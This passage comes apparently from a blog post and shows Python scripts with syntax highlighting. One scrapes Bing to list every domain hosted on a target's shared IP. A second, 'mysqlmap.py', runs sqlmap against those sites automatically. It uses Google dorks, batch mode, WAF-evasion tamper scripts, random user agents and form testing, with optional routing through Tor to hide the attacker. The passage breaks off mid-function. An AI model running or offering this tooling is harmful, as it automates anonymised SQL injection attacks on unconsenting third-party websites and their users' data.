        <span class="nf">get_the_one_target_domains</span><span class="p">(</span><span class="n">sharedHost</span><span class="p">,</span><span class="n">keyword</span><span class="p">,</span><span class="n">num_page</span><span class="p">,</span><span class="n">method</span><span class="p">,</span><span class="n">browser</span><span class="p">)</span>
    
    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'''</span><span class="s">ps -aux | grep firefox | awk </span><span class="sh">'</span><span class="s">{print $2}</span><span class="sh">'</span><span class="s">| xargs kill -9</span><span class="sh">'''</span><span class="p">)</span>




<span class="k">def</span> <span class="nf">get_the_one_target_domains</span><span class="p">(</span><span class="n">sharedHost</span><span class="p">,</span><span class="n">keyword</span><span class="p">,</span><span class="n">num_page</span><span class="p">,</span><span class="n">method</span><span class="p">,</span><span class="n">browser</span><span class="p">):</span>
	<span class="n">sharedHost</span><span class="o">=</span><span class="n">sharedHost</span>
	<span class="n">keyword</span><span class="o">=</span><span class="n">keyword</span>
	<span class="n">num_page</span><span class="o">=</span><span class="n">num_page</span>
	<span class="n">method</span><span class="o">=</span><span class="n">method</span>
	<span class="n">browser</span><span class="o">=</span><span class="n">browser</span>

	<span class="n">all_nics_ip</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">gethostbyname_ex</span><span class="p">(</span><span class="n">sharedHost</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>	
	<span class="n">all_urls</span><span class="o">=</span><span class="p">[]</span>
	
	<span class="kn">from</span> <span class="n">GoogleScraper</span> <span class="kn">import</span> <span class="n">scrape_with_config</span><span class="p">,</span> <span class="n">GoogleSearchError</span>
	
	<span class="c1"># See in the config.cfg file for possible values
</span>	<span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
	    <span class="sh">'</span><span class="s">use_own_ip</span><span class="sh">'</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
	    <span class="sh">'</span><span class="s">keyword</span><span class="sh">'</span><span class="p">:</span> <span class="n">keyword</span><span class="p">,</span>
	    <span class="sh">'</span><span class="s">search_engines</span><span class="sh">'</span><span class="p">:</span> <span class="p">[</span><span class="sh">'</span><span class="s">bing</span><span class="sh">'</span><span class="p">],</span><span class="c1">#google,yahoo,baidu,bing...is ok,see GoogleScraper source.
</span>	    <span class="sh">'</span><span class="s">num_pages_for_keyword</span><span class="sh">'</span><span class="p">:</span> <span class="n">num_page</span><span class="p">,</span>
	    <span class="sh">'</span><span class="s">scrape_method</span><span class="sh">'</span><span class="p">:</span> <span class="n">method</span><span class="p">,</span>
	    <span class="sh">'</span><span class="s">sel_browser</span><span class="sh">'</span><span class="p">:</span> <span class="n">browser</span><span class="p">,</span>
	    <span class="sh">'</span><span class="s">do_caching</span><span class="sh">'</span><span class="p">:</span> <span class="bp">False</span>
	<span class="p">}</span>
	
	<span class="k">try</span><span class="p">:</span>
	    <span class="n">search</span> <span class="o">=</span> <span class="nf">scrape_with_config</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>
	    <span class="c1">#print(11)
</span>	<span class="k">except</span> <span class="n">GoogleSearchError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
	    <span class="nf">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
	
	<span class="c1"># let's inspect what we got
</span>	<span class="sh">'''</span><span class="s">
	for serp in search.serps:    
	    print(serp)
	    print(serp.search_engine_name)
	    print(serp.scrape_method)
	    print(serp.page_number)
	    print(serp.requested_at)
	    print(serp.num_results)
	    
	    # ... more attributes ...
	
	    for link in serp.links:
	        #link=link.split(</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="s">)[]
	        #print(type(link))
	        print(link.link)
	        all_urls.append(link.link)
	</span><span class="sh">'''</span>  
	

	<span class="n">GoogleScraper_bing_domain_list</span><span class="o">=</span><span class="p">[]</span>
	<span class="n">GoogleScraper_bing_https_domain_list</span><span class="o">=</span><span class="p">[]</span>
	<span class="n">GoogleScraper_bing_origin_https_domain_url_list</span><span class="o">=</span><span class="p">[]</span>
	
	<span class="k">for</span> <span class="n">serp</span> <span class="ow">in</span> <span class="n">search</span><span class="p">.</span><span class="n">serps</span><span class="p">:</span>
	    <span class="c1">#print(11)
</span>	    <span class="c1">#print(serp)
</span>	    <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">serp</span><span class="p">.</span><span class="n">links</span><span class="p">:</span>        
	        <span class="k">if</span> <span class="sh">"</span><span class="s">https://</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">link</span><span class="p">.</span><span class="n">link</span><span class="p">:</span>            
	            <span class="n">domain</span><span class="o">=</span><span class="p">(</span><span class="n">link</span><span class="p">.</span><span class="n">link</span><span class="p">)[</span><span class="mi">8</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	            <span class="c1">#print("domain=(link.link)[8:-1].split('/')[0] is:")
</span>	            <span class="c1">#print(domain)
</span>	            <span class="k">try</span><span class="p">:</span>
	            	<span class="n">ip</span><span class="o">=</span><span class="nf">getIp</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
	            <span class="k">except</span><span class="p">:</span>
	            	<span class="k">continue</span>
	            <span class="k">if</span> <span class="n">domain</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">GoogleScraper_bing_domain_list</span> <span class="ow">and</span> <span class="n">ip</span> <span class="ow">in</span> <span class="n">all_nics_ip</span><span class="p">:</span>
	                <span class="n">GoogleScraper_bing_domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>     
	                <span class="n">GoogleScraper_bing_https_domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sh">"</span><span class="s">https://</span><span class="sh">"</span><span class="o">+</span><span class="n">domain</span><span class="p">)</span>
	                <span class="n">GoogleScraper_bing_origin_https_domain_url_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">link</span><span class="p">.</span><span class="n">link</span><span class="p">)</span>
	        <span class="k">else</span><span class="p">:</span>
	            <span class="n">domain</span><span class="o">=</span><span class="p">(</span><span class="n">link</span><span class="p">.</span><span class="n">link</span><span class="p">)[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	            <span class="c1">#print("domain=(link.link)[7:-1].split('/')[0] is:")
</span>	            <span class="c1">#print(domain)
</span>	            <span class="k">try</span><span class="p">:</span>
	            	<span class="n">ip</span><span class="o">=</span><span class="nf">getIp</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
	            <span class="k">except</span><span class="p">:</span>
	            	<span class="k">continue</span>

	            <span class="k">if</span> <span class="n">domain</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">GoogleScraper_bing_domain_list</span> <span class="ow">and</span> <span class="n">ip</span> <span class="ow">in</span> <span class="n">all_nics_ip</span><span class="p">:</span>                
	                <span class="n">GoogleScraper_bing_domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
	                <span class="n">GoogleScraper_bing_https_domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sh">"</span><span class="s">https://</span><span class="sh">"</span><span class="o">+</span><span class="n">domain</span><span class="p">)</span>
	                <span class="n">GoogleScraper_bing_origin_https_domain_url_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">link</span><span class="p">.</span><span class="n">link</span><span class="p">)</span>


	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">GoogleScraper_bing_domain list is:</span><span class="sh">"</span><span class="p">)</span>
	<span class="k">for</span> <span class="n">pie</span> <span class="ow">in</span> <span class="n">GoogleScraper_bing_domain_list</span><span class="p">:</span>
	    <span class="nf">print</span><span class="p">(</span><span class="n">pie</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">GoogleScraper_bing_https_domain_list is:</span><span class="sh">"</span><span class="p">)</span>
	<span class="k">for</span> <span class="n">pie</span> <span class="ow">in</span> <span class="n">GoogleScraper_bing_https_domain_list</span><span class="p">:</span>
	    <span class="nf">print</span><span class="p">(</span><span class="n">pie</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">GoogleScraper_bing_origin_https_domain_url_list is:</span><span class="sh">"</span><span class="p">)</span>
	<span class="k">for</span> <span class="n">pie</span> <span class="ow">in</span> <span class="n">GoogleScraper_bing_origin_https_domain_url_list</span><span class="p">:</span>
	    <span class="nf">print</span><span class="p">(</span><span class="n">pie</span><span class="p">)</span>

	<span class="nf">print</span><span class="p">(</span><span class="mi">555555</span><span class="p">)</span>
	<span class="c1">#sometimes when there are only one page result in the browser,the GoogleScraper 
</span>	<span class="c1">#does not work well,so blew we can import "my_bing_domains_v1" module to use
</span>	<span class="c1">#normal bing_api to get the domain with only one page result in the browser when
</span>	<span class="c1">#we used GoogleScraper's bing_domain search
</span>	<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">GoogleScraper_bing_domain_list</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">:</span>
		<span class="c1">#print(6666666666)
</span>		<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 my_bing_domains_v1_alone.py %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sharedHost</span><span class="p">)</span>
		<span class="nf">print</span><span class="p">(</span><span class="mi">6666666666</span><span class="p">)</span>
		<span class="sh">'''</span><span class="s">
		import my_bing_domains_v1		
		GoogleScraper_bing_domain_list=((my_bing_domains_v1.get_the_one_target_domains)(sharedHost))[0]
		print(6666666666)
		GoogleScraper_bing_https_domain_list=((my_bing_domains_v1.get_the_one_target_domains)(sharedHost))[1]
		GoogleScraper_bing_origin_https_domain_url_list=((my_bing_domains_v1.get_the_one_target_domains)(sharedHost))[2]
		</span><span class="sh">'''</span>
	<span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">GoogleScraper_bing_domain_list</span><span class="p">,</span><span class="sh">"</span><span class="s">GoogleScraper_bing_domain_list.txt</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">GoogleScraper_bing_https_domain_list</span><span class="p">,</span><span class="sh">"</span><span class="s">GoogleScraper_bing_https_domain_list.txt</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">GoogleScraper_bing_origin_https_domain_url_list</span><span class="p">,</span><span class="sh">"</span><span class="s">GoogleScraper_bing_origin_https_domain_url_list.txt</span><span class="sh">"</span><span class="p">)</span>




<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">myGoogleScraperbingdomains</span><span class="p">()</span>
</code></pre></div></div>

<p>4&gt;mysqlmap.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#works in python 3(selenium changed version,that's myenv)
#coz line53 &amp; line73 use a function from a py3 module,but
#that is not necessary
#in this script file in sqlmap_string,added --tor --tor-type=socks5 --check-tor ,
#other way to add the same effort is:proxychains sqlmap ...
#but this needs the system install proxychains,kali linux2.0 has already installed it,yet
#another way:sqlmap --proxy=socks5://127.0.0.1:9050 (with tor installed in the system)
#
#/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
</span><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="k">def</span> <span class="nf">static_sqli</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
	<span class="c1">#re.search("",url)
</span>	<span class="k">pass</span>

<span class="k">def</span> <span class="nf">sqlmap_g_nohuman</span><span class="p">(</span><span class="n">https_url_or_file</span><span class="p">,</span><span class="n">tor_or_not</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">):</span>
	<span class="c1">#this function use sqlmap's "-g" option to find sqli urls,but this "-g"
</span>	<span class="c1">#option can only get 100 results due to google api restriction,but in 
</span>	<span class="c1">#this mode,there is no need for us human to handle any situation.
</span>	<span class="k">if</span> <span class="n">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sh">"</span><span class="s">(https://)|(https://)</span><span class="sh">"</span><span class="p">,</span><span class="n">https_url_or_file</span><span class="p">):</span>
		<span class="n">domain_url</span><span class="o">=</span><span class="n">https_url_or_file</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span> <span class="k">if</span> <span class="n">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sh">"</span><span class="s">(https://)</span><span class="sh">"</span><span class="p">,</span><span class="n">https_url_or_file</span><span class="p">)</span> <span class="k">else</span> <span class="n">https_url_or_file</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span>
		<span class="n">sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -g </span><span class="sh">"</span><span class="s">site:%s inurl:php|asp|aspx|jsp</span><span class="sh">"</span><span class="s"> --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">domain_url</span><span class="p">,</span><span class="n">https_url_or_file</span><span class="p">)</span>
		<span class="n">forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -g </span><span class="sh">"</span><span class="s">site:%s inurl:php|asp|aspx|jsp</span><span class="sh">"</span><span class="s"> --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">domain_url</span><span class="p">,</span><span class="n">https_url_or_file</span><span class="p">)</span>
		<span class="n">tor_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g </span><span class="sh">"</span><span class="s">site:%s inurl:php|asp|aspx|jsp</span><span class="sh">"</span><span class="s"> --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">domain_url</span><span class="p">,</span><span class="n">https_url_or_file</span><span class="p">)</span>
		<span class="n">tor_forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g </span><span class="sh">"</span><span class="s">site:%s inurl:php|asp|aspx|jsp</span><span class="sh">"</span><span class="s"> --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">domain_url</span><span class="p">,</span><span class="n">https_url_or_file</span><span class="p">)</span>
		<span class="c1">#print("sqlmap_string is:%s" % sqlmap_string)
</span>		<span class="c1">#sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
</span>		<span class="k">if</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">False</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
			<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
				<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
		<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
			<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
				<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>

	<span class="k">else</span><span class="p">:</span>
		<span class="n">fp</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">https_url_or_file</span><span class="p">,</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>
		<span class="n">all_urls</span><span class="o">=</span><span class="n">fp</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
		<span class="n">fp</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
		<span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">all_urls</span><span class="p">:</span>			
			<span class="n">domain_url</span><span class="o">=</span><span class="n">each</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span> <span class="k">if</span> <span class="n">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sh">"</span><span class="s">(https://)</span><span class="sh">"</span><span class="p">,</span><span class="n">each</span><span class="p">)</span> <span class="k">else</span> <span class="n">each</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span>
			<span class="n">sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -g </span><span class="sh">"</span><span class="s">site:%s inurl:php|asp|aspx|jsp</span><span class="sh">"</span><span class="s"> --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">domain_url</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
			<span class="n">forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -g </span><span class="sh">"</span><span class="s">site:%s inurl:php|asp|aspx|jsp</span><span class="sh">"</span><span class="s"> --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">domain_url</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
			<span class="n">tor_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g </span><span class="sh">"</span><span class="s">site:%s inurl:php|asp|aspx|jsp</span><span class="sh">"</span><span class="s"> --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">domain_url</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
			<span class="n">tor_forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g </span><span class="sh">"</span><span class="s">site:%s inurl:php|asp|aspx|jsp</span><span class="sh">"</span><span class="s"> --delay 2 --smart --batch -v 4 --threads 4 --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">domain_url</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
			<span class="c1">#print("sqlmap_string is:%s" % sqlmap_string)
</span>			<span class="c1">#sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
</span>			<span class="k">if</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">False</span><span class="p">:</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
				<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>

			<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
				<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">tor_forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
				<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
					<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">sqlmap_craw</span><span class="p">(</span><span class="n">origin_https_url_or_file</span><span class="p">,</span><span class="n">tor_or_not</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">):</span>
	<span class="c1">#this function use sqlmap's "--crawl" option to find sqli urls.
</span>	<span class="k">if</span> <span class="n">re</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sh">"</span><span class="s">(https://)|(https://)</span><span class="sh">"</span><span class="p">,</span><span class="n">origin_https_url_or_file</span><span class="p">):</span>
		<span class="n">origin_https_url</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">(\s)</span><span class="sh">'</span><span class="p">,</span><span class="sh">""</span><span class="p">,</span><span class="n">origin_https_url_or_file</span><span class="p">)</span>
		<span class="n">sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -u </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">origin_https_url</span><span class="p">,</span><span class="n">origin_https_url</span><span class="p">)</span>
		<span class="n">forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py -u </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">origin_https_url</span><span class="p">,</span><span class="n">origin_https_url</span><span class="p">)</span>
		<span class="n">tor_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">origin_https_url</span><span class="p">,</span><span class="n">origin_https_url</span><span class="p">)</span>
		<span class="n">tor_forms_sqlmap_string</span><span class="o">=</span><span class="sh">'''</span><span class="s">/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms</span><span class="sh">'''</span> <span class="o">%</span> <span class="p">(</span><span class="n">origin_https_url</span><span class="p">,</span><span class="n">origin_https_url</span><span class="p">)</span>
		<span class="c1">#print("sqlmap_string is:%s" % sqlmap_string)
</span>		<span class="k">if</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">False</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">forms_sqlmap_string is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
			<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
				<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/bin/python2.7 %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
			
		<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
